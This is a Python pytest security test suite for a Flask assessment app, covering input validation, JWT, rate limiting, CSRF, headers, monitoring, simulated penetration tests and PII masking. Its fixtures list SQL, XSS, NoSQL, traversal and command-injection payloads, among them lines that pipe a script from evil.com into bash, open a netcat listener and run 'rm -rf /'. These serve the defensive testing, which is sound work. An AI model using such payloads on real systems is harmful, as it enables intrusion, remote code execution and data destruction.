"""
Comprehensive Security Test Suite for MINGUS Assessment System
Tests input validation, JWT security, rate limiting, CSRF protection, security headers,
and penetration testing scenarios.
"""

import pytest
import json
import time
import hashlib
from unittest.mock import patch, Mock, MagicMock
from datetime import datetime, timedelta
from typing import Dict, Any, List

# Import security modules
from backend.security.assessment_security import SecurityValidator
from backend.security.secure_jwt_manager import SecureJWTManager, JWTConfig
from backend.security.csrf_protection import CSRFProtection
from backend.security.security_headers import SecurityHeaders
from backend.security.comprehensive_security_monitor import SecurityMonitor

# Import Flask app factory
from backend.app import create_app


class TestInputValidation:
    """Test input validation security features"""
    
    def setup_method(self):
        """Setup test environment"""
        self.app = create_app('testing')
        self.app_context = self.app.app_context()
        self.app_context.push()
        self.validator = SecurityValidator()
    
    def teardown_method(self):
        """Cleanup test environment"""
        self.app_context.pop()
    
    def test_sql_injection_prevention(self):
        """Test SQL injection pattern detection"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'; DELETE FROM assessments; --",
            "UNION SELECT password FROM users",
            "'; EXEC xp_cmdshell('dir'); --",
            "1'; waitfor delay '00:00:10'; --",
            "admin'/**/OR/**/1=1",
            "1' UNION SELECT * FROM users WHERE '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]
        
        for malicious_input in malicious_inputs:
            result = self.validator.validate_input(malicious_input)
            assert not result["valid"], f"Failed to detect SQL injection: {malicious_input}"
            assert "SQL injection" in result["reason"] or "malicious" in result["reason"].lower()
    
    def test_xss_prevention(self):
        """Test XSS pattern detection"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'></embed>",
            "<link rel='stylesheet' href='javascript:alert(1)'>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
            "<svg onload=alert('xss')>",
            "<body onload=alert('xss')>",
            "<div onclick=alert('xss')>Click me</div>",
            "<a href='javascript:alert(1)'>Click me</a>"
        ]
        
        for malicious_input in malicious_inputs:
            result = self.validator.validate_input(malicious_input)
            assert not result["valid"], f"Failed to detect XSS: {malicious_input}"
            assert "XSS" in result["reason"] or "malicious" in result["reason"].lower()
    
    def test_command_injection_prevention(self):
        """Test command injection pattern detection"""
        malicious_inputs = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "$(whoami)",
            "`id`",
            "; python -c 'import os; os.system(\"ls\")'",
            "&& wget http://evil.com/malware.sh",
            "| nc -l -p 1234",
            "&& curl http://evil.com/shell.sh | bash",
            "; find / -name '*.txt' -exec cat {} \\;"
        ]
        
        for malicious_input in malicious_inputs:
            result = self.validator.validate_input(malicious_input)
            assert not result["valid"], f"Failed to detect command injection: {malicious_input}"
            assert "Command injection" in result["reason"] or "malicious" in result["reason"].lower()
    
    def test_nosql_injection_prevention(self):
        """Test NoSQL injection pattern detection"""
        malicious_inputs = [
            '{"$where": "this.password == this.username"}',
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$exists": true}',
            '{"$in": ["admin", "root"]}',
            '{"$or": [{"username": "admin"}, {"password": "admin"}]}',
            '{"$and": [{"username": "admin"}, {"password": "admin"}]}'
        ]
        
        for malicious_input in malicious_inputs:
            result = self.validator.validate_input(malicious_input)
            assert not result["valid"], f"Failed to detect NoSQL injection: {malicious_input}"
            assert "NoSQL injection" in result["reason"] or "malicious" in result["reason"].lower()
    
    def test_valid_inputs_pass(self):
        """Test that legitimate inputs pass validation"""
        valid_inputs = [
            "Software Engineer",
            "I enjoy working with data analysis",
            "5 years of experience",
            "Atlanta, Georgia",
            "$75,000 annual salary",
            "JavaScript and Python programming",
            "Bachelor's degree in Computer Science",
            "Experience with React and Node.js",
            "Looking for remote opportunities",
            "Passionate about machine learning"
        ]
        
        for valid_input in valid_inputs:
            result = self.validator.validate_input(valid_input)
            assert result["valid"], f"Valid input rejected: {valid_input}"
    
    def test_assessment_data_validation(self):
        """Test assessment data validation"""
        # Valid assessment data
        valid_assessment = {
            'responses': {
                'q1': 'I have 3 years of experience',
                'q2': 'I prefer remote work',
                'q3': 'My salary expectation is $80,000'
            },
            'type': 'ai_job_risk',
            'user_id': 'user123'
        }
        
        result = self.validator.validate_assessment_data(valid_assessment)
        assert result["valid"], "Valid assessment data rejected"
        
        # Invalid assessment data with malicious content
        malicious_assessment = {
            'responses': {
                'q1': '<script>alert("xss")</script>',
                'q2': "'; DROP TABLE users; --",
                'q3': '$(rm -rf /)'
            },
            'type': 'ai_job_risk',
            'user_id': 'user123'
        }
        
        result = self.validator.validate_assessment_data(malicious_assessment)
        assert not result["valid"], "Malicious assessment data accepted"


class TestJWTSecurity:
    """Test JWT security features"""
    
    def setup_method(self):
        """Setup test environment"""
        self.app = create_app('testing')
        self.app_context = self.app.app_context()
        self.app_context.push()
        
        # Configure JWT manager
        config = JWTConfig(
            secret_key='test-secret-key-for-security-testing',
            expiration_hours=1,
            require_ip_validation=True,
            require_user_agent_validation=True
        )
        self.jwt_manager = SecureJWTManager(config)
    
    def teardown_method(self):
        """Cleanup test environment"""
        self.app_context.pop()
    
    @patch('backend.security.secure_jwt_manager.request')
    def test_jwt_validation_with_ip_check(self, mock_request):
        """Test JWT validation with IP address consistency"""
        mock_request.remote_addr = '192.168.1.100'
        mock_request.headers.get.return_value = 'Test User Agent'
        
        # Create token
        token = self.jwt_manager.create_secure_token('user123')
        
        # Validate with same IP
        result = self.jwt_manager.validate_secure_token(token)
        assert result["valid"], "Token validation failed with correct IP"
        
        # Validate with different IP
        mock_request.remote_addr = '192.168.1.101'
        result = self.jwt_manager.validate_secure_token(token)
        assert not result["valid"], "Token validation succeeded with different IP"
        assert "IP address mismatch" in result["reason"]
    
    @patch('backend.security.secure_jwt_manager.request')
    def test_jwt_validation_with_user_agent_check(self, mock_request):
        """Test JWT validation with User-Agent consistency"""
        mock_request.remote_addr = '192.168.1.100'
        mock_request.headers.get.return_value = 'Test User Agent'
        
        # Create token
        token = self.jwt_manager.create_secure_token('user123')
        
        # Validate with same User-Agent
        result = self.jwt_manager.validate_secure_token(token)
        assert result["valid"], "Token validation failed with correct User-Agent"
        
        # Validate with different User-Agent
        mock_request.headers.get.return_value = 'Different User Agent'
        result = self.jwt_manager.validate_secure_token(token)
        assert not result["valid"], "Token validation succeeded with different User-Agent"
        assert "User-Agent mismatch" in result["reason"]
    
    def test_token_expiration(self):
        """Test token expiration handling"""
        # Create token with short expiration
        with patch('time.time', return_value=1000000):
            token = self.jwt_manager.create_secure_token('user123')
        
        # Try to validate expired token
        with patch('time.time', return_value=1000000 + 3700):  # 1 hour + 1 minute later
            result = self.jwt_manager.validate_secure_token(token)
            assert not result["valid"], "Expired token validation succeeded"
            assert "Token expired" in result["reason"]
    
    def test_token_blacklisting(self):
        """Test token blacklisting functionality"""
        token = self.jwt_manager.create_secure_token('user123')
        
        # Blacklist token
        self.jwt_manager.blacklist_token(token)
        
        # Try to validate blacklisted token
        result = self.jwt_manager.validate_secure_token(token)
        assert not result["valid"], "Blacklisted token validation succeeded"
        assert "Token blacklisted" in result["reason"]
    
    def test_token_tampering_detection(self):
        """Test detection of tampered tokens"""
        token = self.jwt_manager.create_secure_token('user123')
        
        # Tamper with token
        tampered_token = token[:-10] + "tampered"
        
        # Try to validate tampered token
        result = self.jwt_manager.validate_secure_token(tampered_token)
        assert not result["valid"], "Tampered token validation succeeded"
        assert "Invalid token" in result["reason"]


class TestRateLimiting:
    """Test rate limiting functionality"""
    
    def setup_method(self):
        """Setup test environment"""
        self.app = create_app('testing')
        self.client = self.app.test_client()
        self.app_context = self.app.app_context()
        self.app_context.push()
    
    def teardown_method(self):
        """Cleanup test environment"""
        self.app_context.pop()
    
    def test_assessment_submission_rate_limit(self):
        """Test rate limiting on assessment submissions"""
        # Simulate multiple rapid assessment submissions
        assessment_data = {
            'responses': {'q1': 'answer1', 'q2': 'answer2'},
            'type': 'ai_job_risk'
        }
        
        # First 3 submissions should succeed (assuming rate limit of 3 per minute)
        for i in range(3):
            response = self.client.post('/api/assessments/ai_job_risk/submit',
                                      data=json.dumps(assessment_data),
                                      content_type='application/json')
            assert response.status_code != 429, f"Request {i+1} was rate limited unexpectedly"
        
        # 4th submission should be rate limited
        response = self.client.post('/api/assessments/ai_job_risk/submit',
                                  data=json.dumps(assessment_data),
                                  content_type='application/json')
        assert response.status_code == 429, "Rate limit not enforced"
        assert 'Retry-After' in response.headers
    
    def test_login_rate_limit(self):
        """Test rate limiting on login attempts"""
        login_data = {
            'email': 'test@example.com',
            'password': 'wrongpassword'
        }
        
        # Multiple failed login attempts should trigger rate limiting
        for i in range(6):  # Assuming rate limit of 5 per 15 minutes
            response = self.client.post('/api/auth/login',
                                      data=json.dumps(login_data),
                                      content_type='application/json')
        
        # Next attempt should be rate limited
        response = self.client.post('/api/auth/login',
                                  data=json.dumps(login_data),
                                  content_type='application/json')
        assert response.status_code == 429, "Login rate limit not enforced"
    
    def test_api_endpoint_rate_limit(self):
        """Test rate limiting on general API endpoints"""
        # Test rate limiting on user profile endpoint
        for i in range(10):  # Assuming rate limit of 10 per minute
            response = self.client.get('/api/user/profile')
        
        # Next request should be rate limited
        response = self.client.get('/api/user/profile')
        assert response.status_code == 429, "API rate limit not enforced"


class TestCSRFProtection:
    """Test CSRF protection functionality"""
    
    def setup_method(self):
        """Setup test environment"""
        self.app = create_app('testing')
        self.client = self.app.test_client()
        self.app_context = self.app.app_context()
        self.app_context.push()
        
        # Initialize CSRF protection
        self.csrf_protection = CSRFProtection()
    
    def teardown_method(self):
        """Cleanup test environment"""
        self.app_context.pop()
    
    def test_csrf_token_required(self):
        """Test CSRF token requirement"""
        assessment_data = {
            'responses': {'q1': 'answer1'},
            'type': 'ai_job_risk'
        }
        
        # Request without CSRF token should fail
        response = self.client.post('/api/assessments/ai_job_risk/submit',
                                  data=json.dumps(assessment_data),
                                  content_type='application/json')
        assert response.status_code == 403
        assert b'CSRF token required' in response.data
    
    def test_invalid_csrf_token(self):
        """Test invalid CSRF token rejection"""
        assessment_data = {
            'responses': {'q1': 'answer1'},
            'type': 'ai_job_risk'
        }
        
        headers = {'X-CSRFToken': 'invalid_token_123'}
        response = self.client.post('/api/assessments/ai_job_risk/submit',
                                  data=json.dumps(assessment_data),
                                  content_type='application/json',
                                  headers=headers)
        assert response.status_code == 403
        assert b'Invalid CSRF token' in response.data
    
    def test_valid_csrf_token(self):
        """Test valid CSRF token acceptance"""
        # Get CSRF token first
        response = self.client.get('/api/csrf-token')
        assert response.status_code == 200
        
        csrf_token = response.json.get('csrf_token')
        assert csrf_token is not None
        
        # Use valid CSRF token
        assessment_data = {
            'responses': {'q1': 'answer1'},
            'type': 'ai_job_risk'
        }
        
        headers = {'X-CSRFToken': csrf_token}
        response = self.client.post('/api/assessments/ai_job_risk/submit',
                                  data=json.dumps(assessment_data),
                                  content_type='application/json',
                                  headers=headers)
        assert response.status_code != 403, "Valid CSRF token rejected"


class TestSecurityHeaders:
    """Test security headers functionality"""
    
    def setup_method(self):
        """Setup test environment"""
        self.app = create_app('testing')
        self.client = self.app.test_client()
        self.app_context = self.app.app_context()
        self.app_context.push()
        
        # Initialize security headers
        self.security_headers = SecurityHeaders()
    
    def teardown_method(self):
        """Cleanup test environment"""
        self.app_context.pop()
    
    def test_security_headers_present(self):
        """Test that security headers are properly set"""
        response = self.client.get('/')
        
        # Check for security headers
        assert response.headers.get('X-Content-Type-Options') == 'nosniff'
        assert response.headers.get('X-Frame-Options') == 'DENY'
        assert response.headers.get('X-XSS-Protection') == '1; mode=block'
        assert 'max-age=31536000' in response.headers.get('Strict-Transport-Security', '')
        assert 'default-src' in response.headers.get('Content-Security-Policy', '')
        assert response.headers.get('Referrer-Policy') == 'strict-origin-when-cross-origin'
        
        # Check that server header is removed
        assert 'Server' not in response.headers
    
    def test_content_security_policy(self):
        """Test Content Security Policy header"""
        response = self.client.get('/')
        csp_header = response.headers.get('Content-Security-Policy', '')
        
        # Check for essential CSP directives
        assert 'default-src' in csp_header
        assert 'script-src' in csp_header
        assert 'style-src' in csp_header
        assert 'img-src' in csp_header
        assert 'connect-src' in csp_header
    
    def test_hsts_header(self):
        """Test HTTP Strict Transport Security header"""
        response = self.client.get('/')
        hsts_header = response.headers.get('Strict-Transport-Security', '')
        
        # Check for HSTS directives
        assert 'max-age=' in hsts_header
        assert 'includeSubDomains' in hsts_header


class TestSecurityMonitoring:
    """Test security monitoring functionality"""
    
    def setup_method(self):
        """Setup test environment"""
        self.app = create_app('testing')
        self.app_context = self.app.app_context()
        self.app_context.push()
        
        # Initialize security monitor
        self.monitor = SecurityMonitor()
    
    def teardown_method(self):
        """Cleanup test environment"""
        self.app_context.pop()
    
    def test_security_event_logging(self):
        """Test security event logging functionality"""
        # Test logging a security event
        event_data = self.monitor.log_security_event(
            'test_event',
            'test_user',
            {'test_detail': 'test_value'},
            'WARNING'
        )
        
        assert event_data['event_type'] == 'test_event'
        assert event_data['user_identifier'] == 'test_user'
        assert event_data['severity'] == 'WARNING'
        assert 'timestamp' in event_data
    
    @patch('backend.security.comprehensive_security_monitor.SecurityAlerter.send_security_alert_email')
    def test_security_alert_threshold(self, mock_send_alert):
        """Test security alert threshold triggering"""
        # Simulate multiple failed login attempts
        for i in range(6):  # Threshold is 5
            self.monitor.log_security_event(
                'auth_failure',
                f'user_{i}',
                {'attempt': i+1},
                'WARNING'
            )
        
        # Check that alert was triggered
        mock_send_alert.assert_called()
    
    def test_suspicious_behavior_detection(self):
        """Test suspicious behavior detection"""
        # Simulate suspicious behavior patterns
        suspicious_events = [
            ('rapid_assessment_submission', 'user123', {'count': 10}, 'WARNING'),
            ('unusual_ip_access', 'user123', {'ip': '192.168.1.999'}, 'WARNING'),
            ('data_access_pattern', 'user123', {'pattern': 'bulk_download'}, 'WARNING')
        ]
        
        for event_type, user_id, details, severity in suspicious_events:
            event_data = self.monitor.log_security_event(event_type, user_id, details, severity)
            assert event_data['event_type'] == event_type
            assert event_data['user_identifier'] == user_id


class TestPenetrationScenarios:
    """Test penetration testing scenarios"""
    
    def setup_method(self):
        """Setup test environment"""
        self.app = create_app('testing')
        self.client = self.app.test_client()
        self.app_context = self.app.app_context()
        self.app_context.push()
    
    def teardown_method(self):
        """Cleanup test environment"""
        self.app_context.pop()
    
    def test_authentication_bypass_attempts(self):
        """Simulate authentication bypass attempts"""
        bypass_payloads = [
            {'user_id': 'admin', 'password': "' OR '1'='1"},
            {'user_id': 'admin', 'password': '" OR "1"="1'},
            {'user_id': 'admin', 'password': "' OR 1=1 --"},
            {'user_id': 'admin', 'password': "admin'/**/OR/**/1=1"},
            {'user_id': 'admin', 'password': "' UNION SELECT * FROM users --"},
            {'user_id': 'admin', 'password': "'; DROP TABLE users; --"},
        ]
        
        for payload in bypass_payloads:
            response = self.client.post('/api/auth/login',
                                      data=json.dumps(payload),
                                      content_type='application/json')
            assert response.status_code != 200, f"Authentication bypass succeeded with payload: {payload}"
    
    def test_privilege_escalation_attempts(self):
        """Simulate privilege escalation attempts"""
        # Test accessing admin endpoints without proper authorization
        admin_endpoints = [
            '/api/admin/users',
            '/api/admin/assessments/stats',
            '/api/admin/security/logs',
            '/api/admin/system/config',
            '/api/admin/data/export'
        ]
        
        for endpoint in admin_endpoints:
            response = self.client.get(endpoint)
            assert response.status_code in [401, 403], f"Unauthorized access allowed to {endpoint}"
    
    def test_mass_assignment_vulnerability(self):
        """Test for mass assignment vulnerabilities"""
        # Attempt to modify protected fields
        malicious_payload = {
            'responses': {'q1': 'answer1'},
            'type': 'ai_job_risk',
            'is_admin': True,  # Attempt to assign admin privileges
            'user_role': 'administrator',  # Attempt role escalation
            'subscription_tier': 'premium',  # Attempt to upgrade subscription
            'permissions': ['admin', 'superuser'],  # Attempt to assign permissions
            'api_key': 'malicious_key'  # Attempt to set API key
        }
        
        response = self.client.post('/api/assessments/ai_job_risk/submit',
                                  data=json.dumps(malicious_payload),
                                  content_type='application/json')
        
        # Check that protected fields were not assigned
        if response.status_code == 200:
            data = json.loads(response.data)
            assert 'is_admin' not in data
            assert 'user_role' not in data
            assert 'subscription_tier' not in data
            assert 'permissions' not in data
            assert 'api_key' not in data
    
    def test_directory_traversal_attempts(self):
        """Test directory traversal attack prevention"""
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd'
        ]
        
        for payload in traversal_payloads:
            response = self.client.get(f'/api/files/{payload}')
            assert response.status_code in [400, 403, 404], f"Directory traversal succeeded with payload: {payload}"
    
    def test_sql_injection_attempts(self):
        """Test SQL injection attack prevention"""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1' --",
            "admin'; DELETE FROM assessments; --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "1' UNION SELECT password FROM users WHERE '1'='1"
        ]
        
        for payload in sql_injection_payloads:
            response = self.client.post('/api/search',
                                      data=json.dumps({'query': payload}),
                                      content_type='application/json')
            assert response.status_code in [400, 403], f"SQL injection succeeded with payload: {payload}"
    
    def test_xss_attempts(self):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<svg onload=alert('xss')>"
        ]
        
        for payload in xss_payloads:
            response = self.client.post('/api/comments',
                                      data=json.dumps({'content': payload}),
                                      content_type='application/json')
            assert response.status_code in [400, 403], f"XSS attack succeeded with payload: {payload}"


class TestDataProtection:
    """Test data protection and privacy features"""
    
    def setup_method(self):
        """Setup test environment"""
        self.app = create_app('testing')
        self.app_context = self.app.app_context()
        self.app_context.push()
    
    def teardown_method(self):
        """Cleanup test environment"""
        self.app_context.pop()
    
    def test_pii_detection_and_masking(self):
        """Test PII detection and masking functionality"""
        from backend.security.data_protection_service import DataProtectionService
        
        protection_service = DataProtectionService()
        
        # Test PII detection
        test_data = {
            'name': 'John Doe',
            'email': 'john.doe@example.com',
            'ssn': '123-45-6789',
            'phone': '555-123-4567',
            'address': '123 Main St, Atlanta, GA 30301'
        }
        
        masked_data = protection_service.mask_pii(test_data)
        
        # Check that PII is masked
        assert masked_data['name'] != test_data['name']
        assert masked_data['email'] != test_data['email']
        assert masked_data['ssn'] != test_data['ssn']
        assert masked_data['phone'] != test_data['phone']
        assert masked_data['address'] != test_data['address']
    
    def test_data_encryption(self):
        """Test data encryption functionality"""
        from backend.security.data_protection_service import DataProtectionService
        
        protection_service = DataProtectionService()
        
        sensitive_data = {
            'credit_card': '4111111111111111',
            'bank_account': '1234567890',
            'password': 'secretpassword123'
        }
        
        # Encrypt sensitive data
        encrypted_data = protection_service.encrypt_sensitive_data(sensitive_data)
        
        # Check that data is encrypted
        assert encrypted_data['credit_card'] != sensitive_data['credit_card']
        assert encrypted_data['bank_account'] != sensitive_data['bank_account']
        assert encrypted_data['password'] != sensitive_data['password']
        
        # Decrypt and verify
        decrypted_data = protection_service.decrypt_sensitive_data(encrypted_data)
        assert decrypted_data['credit_card'] == sensitive_data['credit_card']
        assert decrypted_data['bank_account'] == sensitive_data['bank_account']
        assert decrypted_data['password'] == sensitive_data['password']


# Security test configuration
pytest.ini = """
[tool:pytest]
markers = 
    security: marks tests as security tests
    slow: marks tests as slow running
testpaths = tests/security
python_files = test_*.py
python_classes = Test*
python_functions = test_*
addopts = -v --tb=short
"""


def run_security_tests():
    """Run all security tests and generate report"""
    import subprocess
    import sys
    
    # Run security-specific tests
    result = subprocess.run([
        sys.executable, '-m', 'pytest',
        'tests/security/',
        '--tb=short',
        '-v',
        '--junit-xml=security-test-results.xml',
        '--html=security-test-report.html',
        '--self-contained-html'
    ], capture_output=True, text=True)
    
    print("Security Test Results:")
    print(result.stdout)
    if result.stderr:
        print("Errors:", result.stderr)
    
    return result.returncode == 0


if __name__ == "__main__":
    # Run security tests
    success = run_security_tests()
    exit(0 if success else 1)
